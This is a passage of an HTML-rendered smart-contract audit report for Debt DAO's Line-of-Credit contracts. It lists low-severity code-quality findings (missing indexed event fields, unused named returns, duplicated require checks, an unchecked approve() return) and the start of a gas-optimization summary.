href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L163-L169\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L163-L169</a></p>\n<h2 id=\"n16--event-is-missing-indexed-fields\" style=\"position:relative;\"><a href=\"#n16--event-is-missing-indexed-fields\" aria-label=\"n16  event is missing indexed fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑16]  Event is missing <code>indexed</code> fields</h2>\n<p>Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it’s not necessarily best to index the maximum allowed per event (three fields). Each <code>event</code> should use three <code>indexed</code> fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.</p>\n<p><em>There are 4 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MutualConsent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">        </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MutualConsentRegistered</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_consentHash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">:       );</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L21-L23\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L21-L23</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">       </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AddSpigot</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownerSplit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">       </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimRevenue</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">escrowed</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">       </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimEscrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:      );</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L241-L244\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L241-L244</a></p>\n<h2 id=\"n17--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" style=\"position:relative;\"><a href=\"#n17--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" aria-label=\"n17  not using the named return variables anywhere in the function is confusing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑17]  Not using the named return variables anywhere in the function is confusing</h2>\n<p>Consider changing the variable to be an unnamed one.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRevenue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">71            </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">72:           </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">85        </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimEscrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">86            </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">87            </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">88:           </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">) </span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L70-L72\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L70-L72</a></p>\n<h2 id=\"n18--duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" style=\"position:relative;\"><a href=\"#n18--duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\" aria-label=\"n18  duplicated requirerevert checks should be refactored to a modifier or function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑18]  Duplicated <code>require()</code>/<code>revert()</code> checks should be refactored to a modifier or function</h2>\n<p>The compiler will inline the function, which will avoid <code>JUMP</code> instructions usually associated with functions.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">259</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interestRate</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">drate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">frate</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L259\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L259</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L161\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L161</a></p>\n<hr>\n<h2 id=\"excluded-non-critical-issues-findings\" style=\"position:relative;\"><a href=\"#excluded-non-critical-issues-findings\" aria-label=\"excluded non critical issues findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded Non-Critical Issues Findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[N‑19]</td>\n<td align=\"left\">Return values of <code>approve()</code> not checked</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 1 instances over 1 issues</p>\n<h2 id=\"n19--return-values-of-approve-not-checked\" style=\"position:relative;\"><a href=\"#n19--return-values-of-approve-not-checked\" aria-label=\"n19  return values of approve not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑19]  Return values of <code>approve()</code> not checked</h2>\n<p>Not all <code>IERC20</code> implementations <code>revert()</code> when there’s a failure in <code>approve()</code>. The function signature has a <code>boolean</code> return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sellToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swapTarget</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L134\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L134</a></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 42 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/452\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/513\">me_na0mi</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/512\">JC</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/510\">brgltd</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/485\">c3phas</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/480\">Awesome</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/479\">ajtra</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/456\">Deivitto</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/455\">rotcivegaf</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/450\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/442\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/425\">B2</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/399\">cryptonue</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/392\">RedOneN</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/383\">Diana</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/335\">__141345__</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/293\">erictee</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/286\">karanctf</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/275\">peanuts</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/273\">TomJ</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/268\">zaskoh</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/246\">seyni</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/241\">ReyAdmirado</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/233\">0x1f8b</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/230\">saneryee</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/203\">Metatron</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/193\">tnevler</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/164\">Rahoz</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/154\">gogo</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/146\">exolorkistis</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/140\">durianSausage</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/138\">0xRajkumar</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/105\">aphak5010</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/99\">oyc_109</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/80\">ch0bu</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/79\">martin</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/67\">Saintcode_</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/66\">Rolezn</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/62\">emrekocak</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/45\">chrisdior4</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/32\">Bnke0x0</a>, and\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/10\">RaymondFam</a>\n.</em></p>\n<h2 id=\"gas-optimizations-summary\" style=\"position:relative;\"><a href=\"#gas-optimizations-summary\" aria-label=\"gas optimizations summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">State variables only set in the constructor should be declared <code>immutable</code></td>\n<td align=\"center\">2</td>\n<td align=\"center\">4194</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\">Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</td>\n<td align=\"center\">5</td>\n<td align=\"center\">600</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</td>\n<td align=\"center\">3</td>\n<td align=\"center\">12600</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\">Avoid contract existence checks by using low level calls</td>\n<td align=\"center\">27</td>\n<td align=\"center\">2700</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">5</td>\n<td align=\"center\">485</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">4</td>\n<td align=\"center\">80</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\">Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</td>\n<td align=\"center\">3</td>\n<td align=\"center\">255</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\"><code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</td>\n<td align=\"center\">6</td>\n<td align=\"center\">360</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\"><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">15</td>\n<td align=\"center\">330</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">3</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\">Inverting the condition of an <code>if</code>-<code>else</code>-statement wastes gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\"><code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\">Functions guaranteed to revert 